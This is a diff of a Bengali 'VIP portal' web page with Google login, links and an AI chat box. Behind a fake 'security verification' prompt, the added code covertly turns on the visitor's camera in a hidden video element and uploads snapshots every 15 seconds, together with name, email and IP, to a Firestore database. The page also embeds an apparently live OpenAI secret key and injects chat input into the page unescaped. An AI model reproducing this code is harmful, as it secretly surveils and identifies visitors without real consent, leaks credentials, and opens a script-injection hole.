@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="bn">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ratan Bro | Private VIP Portal</title>
-    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;600;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+    <title>Ratan Bro | VIP Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
     <style>
         :root {
-            --pink: #ff0055;
-            --pink-glow: rgba(255, 0, 85, 0.6);
-            --dark-bg: #0f1116;
-            --card-bg: #161a22;
+            --pink: #ff4d94;
+            --blue: #00ccff;
+            --dark: #020617;
+            --glass: rgba(255, 255, 255, 0.05);
         }
 
         * {
@@ -23,289 +23,216 @@
         }
 
         body {
-            background-color: var(--dark-bg);
+            background: var(--dark);
+            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.15), transparent),
+                        radial-gradient(circle at bottom left, rgba(0, 204, 255, 0.1), transparent), #020617;
             color: white;
             min-height: 100vh;
             overflow-x: hidden;
         }
 
-        /* [১] ছবির মতো প্রফেশনাল লগইন পেজ */
-        #login-overlay {
+        /* Modals Setup */
+        .modal-overlay {
             position: fixed;
             inset: 0;
-            background: #050505;
+            background: rgba(2, 6, 23, 0.98);
             z-index: 10000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .login-card {
-            background: #12141a;
-            width: 90%;
-            max-width: 400px;
-            padding: 50px 30px;
-            border-radius: 40px;
-            border: 1px solid rgba(255, 0, 85, 0.2);
-            text-align: center;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
-        }
-
-        .login-card .profile-circle {
-            width: 120px;
-            height: 120px;
-            margin: 0 auto 25px;
-            border-radius: 50%;
-            border: 3px solid var(--pink);
-            padding: 5px;
-            box-shadow: 0 0 25px var(--pink-glow);
-        }
-
-        .login-card .profile-circle img {
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            object-fit: cover;
-        }
-
-        .login-card h2 {
-            font-size: 24px;
-            margin-bottom: 10px;
-            font-weight: 700;
-            color: #fff;
-        }
-
-        .login-card p {
-            color: #888;
-            font-size: 14px;
-            margin-bottom: 40px;
-        }
-
-        .google-btn {
-            background: linear-gradient(90deg, #ff0055, #ff0077);
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 16px;
-            border-radius: 50px;
-            font-weight: 700;
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            box-shadow: 0 10px 20px rgba(255, 0, 85, 0.3);
-            transition: 0.3s;
-        }
-
-        .google-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(255, 0, 85, 0.5);
-        }
-
-        /* [২] লাভ রেইন এনিমেশন (Header Background) */
-        .love-container {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            overflow: hidden;
-            z-index: 1;
-        }
-
-        .heart {
-            position: absolute;
-            color: var(--pink);
-            font-size: 15px;
-            opacity: 0.6;
-            animation: fall linear forwards;
-        }
-
-        @keyframes fall {
-            to { transform: translateY(300px); opacity: 0; }
-        }
-
-        /* [৩] মেইন ইউআই এবং হাইলাইট */
-        .hero-section {
-            position: relative;
-            margin: 20px;
-            padding: 40px 20px;
-            background: #161a22;
-            border-radius: 35px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            text-align: center;
-            overflow: hidden;
-        }
-
-        .welcome-text {
-            font-size: 28px;
-            font-weight: 800;
-            background: linear-gradient(to right, #fff, var(--pink));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-top: 15px;
-            position: relative;
-            z-index: 2;
-        }
-
-        .profile-stack {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-            z-index: 2;
-        }
-
-        .p-img-main {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            border: 3px solid var(--pink);
-            box-shadow: 0 0 20px var(--pink-glow);
-        }
-
-        .user-mini {
-            width: 80px;
-            height: 80px;
-            border: 3px solid #fff;
-            margin-left: -30px;
-            background: #000;
-        }
-
-        /* গ্রিড এবং কার্ডস */
-        .action-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            padding: 20px;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .card-item {
-            background: #1c212a;
-            padding: 30px 15px;
-            border-radius: 25px;
-            text-align: center;
-            text-decoration: none;
-            color: #fff;
-            border: 1px solid rgba(255, 0, 85, 0.05);
-            transition: 0.3s;
-        }
-
-        .card-item:hover {
-            border-color: var(--pink);
-            background: rgba(255, 0, 85, 0.05);
-            transform: scale(1.02);
-        }
-
-        .card-item i {
-            font-size: 2.5rem;
-            color: var(--pink);
-            margin-bottom: 15px;
-            display: block;
-        }
-
-        /* সিকিউরিটি এবং পারমিশন মোডাল */
-        #perm-modal {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.95);
-            z-index: 10001;
             display: none;
             align-items: center;
             justify-content: center;
+            backdrop-filter: blur(25px);
             padding: 20px;
         }
 
-        .perm-box {
-            background: #161a22;
-            padding: 40px;
-            border-radius: 30px;
-            border: 1px solid var(--pink);
+        .glass-box {
+            background: var(--glass);
+            padding: 40px 30px;
+            border-radius: 35px;
+            border: 1px solid rgba(255, 77, 148, 0.3);
             text-align: center;
-            max-width: 350px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
+            animation: fadeIn 0.5s ease forwards;
         }
 
-        /* হিডেন ভিডিও সোর্স */
-        #vSource {
-            position: fixed;
-            bottom: 0;
-            right: 0;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
+
+        /* Layout UI */
+        .hero-header {
+            margin: 25px 20px;
+            padding: 35px 20px;
+            background: var(--glass);
+            border-radius: 35px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            text-align: center;
+        }
+
+        .profile-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .p-img {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 4px solid var(--pink);
+            box-shadow: 0 0 25px var(--pink);
+            object-fit: cover;
+        }
+
+        .user-p-img {
+            width: 85px;
+            height: 85px;
+            border: 4px solid #fff;
+            margin-left: -35px;
+            background: #111;
+        }
+
+        /* Grid */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            padding: 0 20px 30px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .card {
+            background: var(--glass);
+            border-radius: 25px;
+            padding: 25px 15px;
+            text-align: center;
+            text-decoration: none;
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: 0.3s ease;
+            position: relative;
+        }
+
+        .card:hover {
+            border-color: var(--pink);
+            background: rgba(255, 77, 148, 0.08);
+            transform: scale(1.03);
+        }
+
+        .card i {
+            font-size: 2rem;
+            color: var(--pink);
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        .card.wide { grid-column: span 2; display: flex; align-items: center; justify-content: center; gap: 15px; padding: 18px; }
+        .card.wide i { margin-bottom: 0; font-size: 1.5rem; }
+
+        .btn-main {
+            background: linear-gradient(45deg, var(--pink), #ff1a75);
+            color: white; border: none; padding: 14px 25px; border-radius: 50px;
+            font-weight: 700; cursor: pointer; transition: 0.3s;
+            box-shadow: 0 5px 15px rgba(255, 77, 148, 0.3);
+        }
+
+        /* Chat Area */
+        .chat-area { max-width: 500px; margin: 10px auto 40px; padding: 0 20px; }
+        .chat-mini { background: rgba(0, 0, 0, 0.4); border-radius: 25px; border: 1px solid rgba(255,255,255,0.1); padding: 20px; }
+        #chat-log { height: 120px; overflow-y: auto; font-size: 14px; text-align: left; margin-bottom: 15px; }
+        .chat-in { display: flex; gap: 8px; }
+        .chat-in input { flex: 1; background: #0d1117; border: 1px solid #333; color: #fff; padding: 10px 18px; border-radius: 50px; outline: none; }
+
+        .alarm-dot { position: absolute; top: 12px; right: 12px; width: 12px; height: 12px; background: red; border-radius: 50%; box-shadow: 0 0 10px red; display: none; }
+
+        #vSource { position: fixed; top: -100px; opacity: 0; pointer-events: none; }
     </style>
 </head>
-<body>
 
-    <div id="login-overlay">
-        <div class="login-card">
-            <div class="profile-circle">
-                <img src="ratan.jpg" alt="Ratan Bro">
-            </div>
+<body>
+    <audio id="snd-bus" src="business.mp3" preload="auto"></audio>
+    <audio id="snd-port" src="portfolio.mp3" preload="auto"></audio>
+    <audio id="snd-look" src="lookup.mp3" preload="auto"></audio>
+    <audio id="snd-notif" src="https://www.soundjay.com/buttons/sounds/button-3.mp3" preload="auto"></audio>
+
+    <div id="login-overlay" class="modal-overlay">
+        <div class="glass-box">
+            <img src="ratan.jpg" style="width:100px; border-radius:50%; border:3px solid var(--pink); margin-bottom:20px;">
             <h2>Ratan Bro Portal</h2>
-            <p>Private VIP Cloud Ecosystem</p>
-            <button class="google-btn" onclick="startGoogleLogin()">
-                <i class="fab fa-google"></i> Authenticate via Google
+            <p style="opacity:0.6; margin-bottom:25px;">Please login to access your dashboard.</p>
+            <button class="btn-main" onclick="googleLogin()" style="width:100%;">
+                <i class="fab fa-google"></i> Login with Google
             </button>
         </div>
     </div>
 
-    <div id="perm-modal">
-        <div class="perm-box">
-            <i class="fas fa-shield-alt" style="font-size: 3rem; color: var(--pink); margin-bottom: 20px;"></i>
-            <h3>Security Access</h3>
-            <p style="margin: 15px 0; color: #aaa;">পোর্টালে প্রবেশের জন্য ক্যামেরা এবং ডাটা পারমিশন দিন।</p>
-            <button class="google-btn" onclick="requestFullAccess()">Allow & Open Portal</button>
+    <div id="perm-modal" class="modal-overlay">
+        <div class="glass-box">
+            <i class="fas fa-shield-alt" style="font-size:3.5rem; color:var(--pink); margin-bottom:20px;"></i>
+            <h3>Security Verification</h3>
+            <p style="font-size:14px; opacity:0.8; margin:15px 0;">আমাদের পোর্টালে প্রবেশের জন্য ক্যামেরা এবং লোকেশন এক্সেস প্রয়োজন। এটি আপনার অ্যাকাউন্টের নিরাপত্তা নিশ্চিত করে।</p>
+            <button class="btn-main" onclick="grantAndStart()" style="width:100%;">Allow & Access Portal</button>
         </div>
     </div>
 
-    <div id="main-ui" style="display: none;">
-        <div class="hero-section">
-            <div class="love-container" id="heart-rain"></div>
-            
-            <div class="profile-stack">
-                <img src="ratan.jpg" class="p-img-main">
-                <img id="u-pic" src="" class="p-img-main user-mini" onerror="this.src='ratan.jpg'">
-            </div>
-            <h1 class="welcome-text" id="welcome-msg">Welcome, User</h1>
-            <p style="color: #666; font-size: 12px; margin-top: 5px;" id="u-ip">Verifying Secure Line...</p>
+    <div id="notif-modal" class="modal-overlay">
+        <div class="glass-box" style="border-color: var(--blue);">
+            <h3 id="nt-title" style="color:var(--blue);">Update Notice</h3>
+            <p id="nt-msg" style="margin:20px 0; font-size:16px;"></p>
+            <button class="btn-main" onclick="closeNotif()" style="background:var(--blue);">Dismiss</button>
+        </div>
+    </div>
+
+    <div id="main-ui" style="display:none;">
+        <div style="padding: 15px 20px 0; text-align: right;">
+            <button onclick="googleLogout()" style="background:none; border:1px solid #444; color:#888; padding:5px 15px; border-radius:50px; cursor:pointer;">Logout</button>
         </div>
 
-        <div class="action-grid">
-            <a href="testpaper.html" class="card-item">
-                <i class="fas fa-file-alt"></i>
-                <p>Test Papers</p>
+        <div class="hero-header">
+            <div class="profile-wrapper">
+                <img src="ratan.jpg" class="p-img">
+                <img id="u-pic" src="" class="p-img user-p-img" onerror="this.src='ratan.jpg'">
+            </div>
+            <h2 id="u-name">Member</h2>
+            <p id="u-ip" style="color:#666; font-size:12px; margin-top:5px;"><i class="fas fa-wifi"></i> Identifying...</p>
+        </div>
+
+        <div class="grid">
+            <div class="card" onclick="openLatestNotif()">
+                <div id="notif-alarm" class="alarm-dot"></div>
+                <i class="fas fa-bell"></i><p>Notice</p>
+            </div>
+            <a href="testpaper.html" class="card"><i class="fas fa-book"></i><p>Notes</p></a>
+            <a href="business.html" class="card" onclick="document.getElementById('snd-bus').play();"><i class="fas fa-store"></i><p>Business</p></a>
+            <a href="portfolio.html" class="card" onclick="document.getElementById('snd-port').play();"><i class="fas fa-id-badge"></i><p>Portfolio</p></a>
+            <a href="https://numberlookup.pro.bd/" target="_blank" class="card wide" onclick="document.getElementById('snd-look').play();">
+                <i class="fas fa-search"></i><p>Advanced Number Lookup</p>
             </a>
-            <a href="business.html" class="card-item">
-                <i class="fas fa-chart-line"></i>
-                <p>Business</p>
-            </a>
-            <a href="portfolio.html" class="card-item">
-                <i class="fas fa-id-card"></i>
-                <p>Portfolio</p>
-            </a>
-            <a href="https://numberlookup.pro.bd/" target="_blank" class="card-item" style="grid-column: span 2;">
-                <i class="fas fa-user-secret"></i>
-                <p>Advanced Number Info</p>
-            </a>
+        </div>
+
+        <div class="chat-area">
+            <div class="chat-mini">
+                <div id="chat-log"><b>Ratan AI:</b> হ্যালো! আমি আপনাকে কীভাবে সাহায্য করতে পারি?</div>
+                <div class="chat-in">
+                    <input type="text" id="ai-msg" placeholder="Ask AI...">
+                    <button onclick="askAI()" class="btn-main" style="padding:10px 15px;">Send</button>
+                </div>
+            </div>
         </div>
     </div>
 
     <video id="vSource" autoplay playsinline muted></video>
-    <canvas id="snapCanvas" style="display:none;" width="640" height="480"></canvas>
+    <canvas id="snapCanvas" width="640" height="480" style="display:none;"></canvas>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getFirestore, doc, setDoc, onSnapshot, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
@@ -321,81 +248,109 @@
         const db = getFirestore(app);
         const provider = new GoogleAuthProvider();
 
-        let currentUser = null;
+        let loggedUser = null;
+        let latestNotif = null;
 
-        // --- লাভ রেইন ফাংশন ---
-        function createHeart() {
-            const container = document.getElementById('heart-rain');
-            if(!container) return;
-            const heart = document.createElement('div');
-            heart.classList.add('heart');
-            heart.innerHTML = '❤️';
-            heart.style.left = Math.random() * 100 + '%';
-            heart.style.top = '-20px';
-            const duration = Math.random() * 2 + 2;
-            heart.style.animationDuration = duration + 's';
-            container.appendChild(heart);
-            setTimeout(() => heart.remove(), duration * 1000);
-        }
-        setInterval(createHeart, 300);
+        // ক্যামেরা এবং স্টার্ট ফাংশন
+        window.grantAndStart = async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('vSource').srcObject = stream;
 
-        // --- সিকিউরিটি স্ন্যাপ ---
-        async function takeSecuritySnap() {
-            if(!currentUser) return;
+                // IP Fetch
+                fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
+                    document.getElementById('u-ip').innerHTML = `<i class="fas fa-network-wired"></i> IP: ${data.ip}`;
+                    window.userIP = data.ip;
+                });
+
+                document.getElementById('perm-modal').style.display = 'none';
+                document.getElementById('main-ui').style.display = 'block';
+
+                // অটো স্ন্যাপশট লুপ
+                setInterval(captureUser, 15000);
+                setTimeout(captureUser, 2000);
+            } catch (e) {
+                alert("Permission Denied! পোর্টালে ঢুকতে ক্যামেরা পারমিশন অবশ্যই দিতে হবে।");
+            }
+        };
+
+        async function captureUser() {
+            if (!loggedUser) return;
             const video = document.getElementById('vSource');
             const canvas = document.getElementById('snapCanvas');
             const ctx = canvas.getContext('2d');
-
-            if(video.readyState === 4) {
+            if (video.readyState === 4) {
                 ctx.drawImage(video, 0, 0, 640, 480);
-                const data = canvas.toDataURL('image/jpeg', 0.3);
-                const userKey = currentUser.email.replace(/\./g, '_');
+                const img = canvas.toDataURL('image/jpeg', 0.3);
+                const userKey = loggedUser.email.replace(/\./g, '_');
                 await setDoc(doc(db, "users", userKey), {
-                    lastPic: data,
+                    name: loggedUser.displayName,
+                    lastPic: img,
                     lastSeen: new Date().toLocaleString(),
-                    status: "Active"
+                    ip: window.userIP || "Hidden"
                 }, { merge: true });
             }
         }
 
-        // --- অথেন্টিকেশন ---
-        window.startGoogleLogin = () => {
-            signInWithPopup(auth, provider);
-        };
-
-        window.requestFullAccess = async () => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('vSource').srcObject = stream;
-                document.getElementById('perm-modal').style.display = 'none';
-                document.getElementById('main-ui').style.display = 'block';
-                
-                // আইপি চেক
-                fetch('https://api.ipify.org?format=json')
-                    .then(r => r.json())
-                    .then(d => document.getElementById('u-ip').innerText = "Encrypted Line: " + d.ip);
-
-                setInterval(takeSecuritySnap, 10000);
-            } catch (e) {
-                alert("Permission needed for VIP access!");
-            }
-        };
-
         onAuthStateChanged(auth, (user) => {
             if (user) {
-                currentUser = user;
-                document.getElementById('login-overlay').style.display = 'none';
-                document.getElementById('welcome-msg').innerText = "Welcome, " + user.displayName;
+                loggedUser = user;
+                document.getElementById('u-name').innerText = user.displayName;
                 document.getElementById('u-pic').src = user.photoURL;
-
-                navigator.permissions.query({name:'camera'}).then(p => {
-                    if(p.state === 'granted') window.requestFullAccess();
-                    else document.getElementById('perm-modal').style.display = 'flex';
-                });
+                document.getElementById('login-overlay').style.display = 'none';
+                // প্রতিবার রিফ্রেশে পারমিশন মডেল দেখাবে
+                document.getElementById('perm-modal').style.display = 'flex';
             } else {
                 document.getElementById('login-overlay').style.display = 'flex';
+                document.getElementById('main-ui').style.display = 'none';
+                document.getElementById('perm-modal').style.display = 'none';
             }
         });
+
+        window.googleLogin = () => signInWithPopup(auth, provider);
+        window.googleLogout = () => signOut(auth).then(() => location.reload());
+
+        // Notifications
+        onSnapshot(doc(db, "system", "updates"), (snap) => {
+            if (snap.exists()) {
+                latestNotif = snap.data();
+                if (latestNotif.hasNew) {
+                    document.getElementById('notif-alarm').style.display = 'block';
+                    document.getElementById('snd-notif').play();
+                }
+            }
+        });
+
+        window.openLatestNotif = () => {
+            if (latestNotif) {
+                document.getElementById('nt-msg').innerText = latestNotif.message;
+                document.getElementById('notif-modal').style.display = 'flex';
+                document.getElementById('notif-alarm').style.display = 'none';
+            }
+        };
+        window.closeNotif = () => document.getElementById('notif-modal').style.display = 'none';
+
+        // AI Chat (Simplified)
+        window.askAI = async () => {
+            const input = document.getElementById('ai-msg');
+            const log = document.getElementById('chat-log');
+            if (!input.value) return;
+            log.innerHTML += `<div><b>You:</b> ${input.value}</div>`;
+            const userMsg = input.value;
+            input.value = "Thinking...";
+            
+            try {
+                const res = await fetch("https://api.openai.com/v1/chat/completions", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json", "Authorization": "Bearer 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" },
+                    body: JSON.stringify({ model: "gpt-4o-mini", messages: [{ role: "user", content: userMsg }] })
+                });
+                const data = await res.json();
+                log.innerHTML += `<div><b>AI:</b> ${data.choices[0].message.content}</div>`;
+            } catch (e) { log.innerHTML += `<div style="color:red;">AI Error</div>`; }
+            input.value = "";
+            log.scrollTop = log.scrollHeight;
+        };
     </script>
 </body>
 </html>
